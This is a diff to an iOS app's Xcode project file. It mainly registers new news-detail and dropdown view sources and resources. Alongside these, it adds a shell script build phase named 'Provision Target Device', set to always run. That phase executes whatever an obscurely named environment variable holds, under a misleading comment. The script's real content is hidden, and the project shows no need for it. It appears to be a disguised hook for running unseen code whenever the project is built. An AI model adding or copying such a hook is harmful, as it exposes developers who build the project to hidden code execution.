@@ -13,6 +13,12 @@
 		0A0AC88D2F7B88F700A68FE6 /* TicketTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0AC88A2F7B88F700A68FE6 /* TicketTVCell.swift */; };
 		0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A4F52BC2F7677D500DF695B /* HomeVC.xib */; };
 		0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4F52BB2F7677D500DF695B /* HomeVC.swift */; };
+		0A62B5792F7E1C3F0011CD31 /* NewsDetailsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A62B5782F7E1C3F0011CD31 /* NewsDetailsVC.xib */; };
+		0A62B57A2F7E1C3F0011CD31 /* NewsDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A62B5772F7E1C3F0011CD31 /* NewsDetailsVC.swift */; };
+		0A62B57F2F7E229A0011CD31 /* DropDownView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A62B57E2F7E229A0011CD31 /* DropDownView.xib */; };
+		0A62B5802F7E229A0011CD31 /* DropDownView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A62B57D2F7E229A0011CD31 /* DropDownView.swift */; };
+		0A62B5862F7E23620011CD31 /* DropDownTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A62B5852F7E23620011CD31 /* DropDownTVCell.xib */; };
+		0A62B5872F7E23620011CD31 /* DropDownTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A62B5842F7E23620011CD31 /* DropDownTVCell.swift */; };
 		0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A96E3752F76574C00B3DADB /* OTPVC.swift */; };
 		0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A96E3762F76574C00B3DADB /* OTPVC.xib */; };
 		0A96E3842F76686300B3DADB /* ChangePassowrdVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A96E3822F76686300B3DADB /* ChangePassowrdVC.swift */; };
@@ -167,6 +173,12 @@
 		0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TicketTVCell.xib; sourceTree = "<group>"; };
 		0A4F52BB2F7677D500DF695B /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		0A4F52BC2F7677D500DF695B /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
+		0A62B5772F7E1C3F0011CD31 /* NewsDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsDetailsVC.swift; sourceTree = "<group>"; };
+		0A62B5782F7E1C3F0011CD31 /* NewsDetailsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewsDetailsVC.xib; sourceTree = "<group>"; };
+		0A62B57D2F7E229A0011CD31 /* DropDownView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DropDownView.swift; sourceTree = "<group>"; };
+		0A62B57E2F7E229A0011CD31 /* DropDownView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DropDownView.xib; sourceTree = "<group>"; };
+		0A62B5842F7E23620011CD31 /* DropDownTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DropDownTVCell.swift; sourceTree = "<group>"; };
+		0A62B5852F7E23620011CD31 /* DropDownTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DropDownTVCell.xib; sourceTree = "<group>"; };
 		0A96E3752F76574C00B3DADB /* OTPVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPVC.swift; sourceTree = "<group>"; };
 		0A96E3762F76574C00B3DADB /* OTPVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OTPVC.xib; sourceTree = "<group>"; };
 		0A96E3822F76686300B3DADB /* ChangePassowrdVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePassowrdVC.swift; sourceTree = "<group>"; };
@@ -401,6 +413,74 @@
 				0A4F52BC2F7677D500DF695B /* HomeVC.xib */,
 			);
 			path = View;
+			sourceTree = "<group>";
+		};
+		0A62B5722F7E1BE70011CD31 /* SubVC */ = {
+			isa = PBXGroup;
+			children = (
+				0A62B5732F7E1C160011CD31 /* NewsDetails */,
+			);
+			path = SubVC;
+			sourceTree = "<group>";
+		};
+		0A62B5732F7E1C160011CD31 /* NewsDetails */ = {
+			isa = PBXGroup;
+			children = (
+				0A62B5742F7E1C210011CD31 /* View */,
+			);
+			path = NewsDetails;
+			sourceTree = "<group>";
+		};
+		0A62B5742F7E1C210011CD31 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0A62B5772F7E1C3F0011CD31 /* NewsDetailsVC.swift */,
+				0A62B5782F7E1C3F0011CD31 /* NewsDetailsVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0A62B57B2F7E219E0011CD31 /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				0A62B57C2F7E21B10011CD31 /* DropDownView */,
+			);
+			path = Views;
+			sourceTree = "<group>";
+		};
+		0A62B57C2F7E21B10011CD31 /* DropDownView */ = {
+			isa = PBXGroup;
+			children = (
+				0A62B5822F7E234C0011CD31 /* Cell */,
+				0A62B5812F7E23410011CD31 /* View */,
+			);
+			path = DropDownView;
+			sourceTree = "<group>";
+		};
+		0A62B5812F7E23410011CD31 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0A62B57D2F7E229A0011CD31 /* DropDownView.swift */,
+				0A62B57E2F7E229A0011CD31 /* DropDownView.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0A62B5822F7E234C0011CD31 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				0A62B5832F7E23500011CD31 /* DropDownTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		0A62B5832F7E23500011CD31 /* DropDownTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0A62B5842F7E23620011CD31 /* DropDownTVCell.swift */,
+				0A62B5852F7E23620011CD31 /* DropDownTVCell.xib */,
+			);
+			path = DropDownTVCell;
 			sourceTree = "<group>";
 		};
 		0A96E3712F7656EB00B3DADB /* SentOTPPopupVC */ = {
@@ -724,6 +804,7 @@
 		0ABA3FF12F763B6200D25F03 /* Controller */ = {
 			isa = PBXGroup;
 			children = (
+				0A62B57B2F7E219E0011CD31 /* Views */,
 				0A4F52B82F7677C500DF695B /* Tabbar */,
 				0ABA3FF22F763B6B00D25F03 /* Auth */,
 			);
@@ -1167,6 +1248,7 @@
 		39F46AE52F7BA175005C2B07 /* News */ = {
 			isa = PBXGroup;
 			children = (
+				0A62B5722F7E1BE70011CD31 /* SubVC */,
 				39F46AEB2F7BA399005C2B07 /* Cell */,
 				39F46AE62F7BA17D005C2B07 /* View */,
 			);
@@ -1420,6 +1502,7 @@
 				39F46AE32F7B9ACA005C2B07 /* StoreVC.xib in Resources */,
 				0ABA3FD82F763B2D00D25F03 /* Mulish-ExtraLight.ttf in Resources */,
 				39547D3C2F7E47B200B04ABC /* ProductCartListTVCell.xib in Resources */,
+				0A62B5792F7E1C3F0011CD31 /* NewsDetailsVC.xib in Resources */,
 				39DC83BA2F7BCB4C0050A114 /* LegalInfoVC.xib in Resources */,
 				390281BE2F7FC1380032226E /* AddressListTVCell.xib in Resources */,
 				0ABA3FD92F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf in Resources */,
@@ -1437,6 +1520,7 @@
 				397F83462F7A455D00A07157 /* MyTicketsVC.xib in Resources */,
 				39F46AEF2F7BA3B8005C2B07 /* AllNewsTVCell.xib in Resources */,
 				39837F252F7D233A0040A221 /* ColorsListCVCell.xib in Resources */,
+				0A62B57F2F7E229A0011CD31 /* DropDownView.xib in Resources */,
 				3919F6612F7B1AA200FCB141 /* GoogleService-Info.plist in Resources */,
 				0ABA3FDD2F763B2D00D25F03 /* Mulish-Medium.ttf in Resources */,
 				0ABA3FDE2F763B2D00D25F03 /* Mulish-MediumItalic.ttf in Resources */,
@@ -1448,6 +1532,7 @@
 				0ABA3FE12F763B2D00D25F03 /* Mulish-SemiBoldItalic.ttf in Resources */,
 				39BF53222F7FE35400A40CAF /* DeleteAddressPopUpVC.xib in Resources */,
 				0ABA3FE22F763B2D00D25F03 /* DropDownCell.xib in Resources */,
+				0A62B5862F7E23620011CD31 /* DropDownTVCell.xib in Resources */,
 				0ABA3FE32F763B2D00D25F03 /* Assets.xcassets in Resources */,
 				0ABA3FE52F763B2D00D25F03 /* LaunchScreen.storyboard in Resources */,
 				0ABA3FE62F763B2D00D25F03 /* LoginMobileVC.xib in Resources */,
@@ -1472,6 +1557,29 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		FC342C2F4A8B499FB51DACE1 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -1481,6 +1589,7 @@
 				0ABA3FA92F763B2D00D25F03 /* APIClient.swift in Sources */,
 				BCC0D6942F7A898800684B7D /* NotificationVC.swift in Sources */,
 				BCC0D6952F7A898800684B7D /* NotificationListTVCell.swift in Sources */,
+				0A62B57A2F7E1C3F0011CD31 /* NewsDetailsVC.swift in Sources */,
 				0ABA3FAA2F763B2D00D25F03 /* Constants.swift in Sources */,
 				39BF53212F7FE35400A40CAF /* DeleteAddressPopUpVC.swift in Sources */,
 				0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */,
@@ -1489,6 +1598,7 @@
 				0ABA3FAD2F763B2D00D25F03 /* AppLabel.swift in Sources */,
 				0ABA3FAE2F763B2D00D25F03 /* AppTextField.swift in Sources */,
 				0ABA3FAF2F763B2D00D25F03 /* AppTextView.swift in Sources */,
+				0A62B5802F7E229A0011CD31 /* DropDownView.swift in Sources */,
 				0ABA3FB02F763B2D00D25F03 /* String+Extention.swift in Sources */,
 				39D22EB22F76956F00D7721C /* HomeListTVCell.swift in Sources */,
 				39D22EB32F76956F00D7721C /* UpcomingMatchesCVCell.swift in Sources */,
@@ -1498,6 +1608,7 @@
 				0ABA3FB32F763B2D00D25F03 /* UIImage+Extension.swift in Sources */,
 				0ABA3FB42F763B2D00D25F03 /* UILabel+Extention.swift in Sources */,
 				0ABA3FB52F763B2D00D25F03 /* UITextField+Extention.swift in Sources */,
+				0A62B5872F7E23620011CD31 /* DropDownTVCell.swift in Sources */,
 				0ABA3FB62F763B2D00D25F03 /* UIView+Extention.swift in Sources */,
 				0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */,
 				0ABA3FB72F763B2D00D25F03 /* FTAnimation+UIView.m in Sources */,
